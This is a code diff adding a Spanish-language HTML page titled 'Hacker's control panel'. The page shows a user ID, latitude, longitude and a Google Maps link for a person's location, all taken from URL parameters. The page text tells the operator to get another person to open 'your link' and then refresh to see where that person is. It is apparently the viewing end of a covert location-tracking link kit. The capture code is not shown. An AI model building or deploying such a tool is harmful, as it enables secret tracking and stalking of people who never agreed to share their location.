@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control del Hacker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #222;
+            color: #f1f1f1;
+        }
+        .container {
+            max-width: 600px;
+            width: 90%;
+            background-color: #333;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            text-align: left;
+        }
+        h1 {
+            color: #4CAF50;
+            text-align: center;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        .coords {
+            color: #FFC107;
+            font-weight: bold;
+        }
+        #mapsLink {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        #mapsLink:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Ubicación Obtenida</h1>
+        <p><strong>ID de Usuario:</strong> <span id="userId"></span></p>
+        <p><strong>Latitud:</strong> <span id="latitude"></span></p>
+        <p><strong>Longitud:</strong> <span id="longitude"></span></p>
+        
+        <a id="mapsLink" href="#" target="_blank">Ver en Google Maps</a>
+        
+        <p style="margin-top: 30px;">
+            _Para ver la ubicación de otra persona, dile que abra tu link y luego actualiza esta página._
+        </p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const lat = params.get('lat');
+            const lon = params.get('lon');
+            const id = params.get('id');
+
+            const userId = document.getElementById('userId');
+            const latitudeSpan = document.getElementById('latitude');
+            const longitudeSpan = document.getElementById('longitude');
+            const mapsLink = document.getElementById('mapsLink');
+
+            if (lat && lon && id) {
+                userId.textContent = id;
+                latitudeSpan.textContent = lat;
+                longitudeSpan.textContent = lon;
+                
+                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                mapsLink.href = googleMapsUrl;
+            } else {
+                userId.textContent = "No hay datos de ubicación disponibles.";
+                latitudeSpan.textContent = "N/A";
+                longitudeSpan.textContent = "N/A";
+                mapsLink.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
